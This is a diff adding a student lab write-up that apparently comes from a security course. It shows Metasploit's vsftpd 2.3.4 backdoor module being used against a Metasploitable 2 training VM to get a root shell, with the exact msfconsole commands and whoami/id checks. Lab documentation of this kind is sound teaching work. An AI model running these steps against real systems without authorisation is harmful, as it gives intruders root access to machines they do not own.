@@ -1,0 +1,122 @@
+# Privilege Escalation
+
+## Module
+Week 4 – Privilege Escalation
+
+## Target System
+Metasploitable 2
+
+## Target IP
+192.168.206.139
+
+## Attacker Machine
+Kali Linux
+
+## Tools Used
+- Metasploit Framework
+- Nmap
+- Kali Linux Terminal
+
+---
+
+# Step 1 – Target Connectivity Test
+
+Command used:
+
+ping 192.168.206.139
+
+Purpose:
+
+Verify that the Metasploitable target machine is reachable from the Kali Linux attacker machine.
+
+Screenshot:
+
+screenshots/01_ping_target.png
+
+---
+
+# Step 2 – Exploit FTP Service
+
+The FTP service running on the target machine was identified as vulnerable (vsftpd 2.3.4).
+
+Metasploit Framework was used to exploit this vulnerability.
+
+Commands used:
+
+msfconsole  
+search vsftpd  
+use exploit/unix/ftp/vsftpd_234_backdoor  
+set RHOST 192.168.206.139  
+run
+
+Purpose:
+
+Execute the exploit module to gain shell access to the target system.
+
+Screenshot:
+
+screenshots/02_shell_access.png
+
+---
+
+# Step 3 – Verify Current User
+
+Command used:
+
+whoami
+
+Purpose:
+
+Check which user account the shell session is running under.
+
+Result:
+
+The shell session was running with root privileges.
+
+Screenshot:
+
+screenshots/03_current_user.png
+
+---
+
+# Step 4 – System Enumeration
+
+Command used:
+
+uname -a
+
+Purpose:
+
+Identify system information such as the kernel version and operating system details.
+
+Screenshot:
+
+screenshots/04_system_info.png
+
+---
+
+# Step 5 – Verify Root Privileges
+
+Command used:
+
+id
+
+Purpose:
+
+Confirm that the attacker has full administrative (root) privileges on the system.
+
+Result:
+
+uid=0(root) gid=0(root)
+
+Screenshot:
+
+screenshots/05_root_access.png
+
+---
+
+# Summary
+
+The FTP service (vsftpd 2.3.4) on the Metasploitable target machine contained a backdoor vulnerability. By exploiting this service using the Metasploit Framework, a shell session was obtained with root privileges.
+
+Since the exploit directly provided root access, no additional privilege escalation techniques were required.
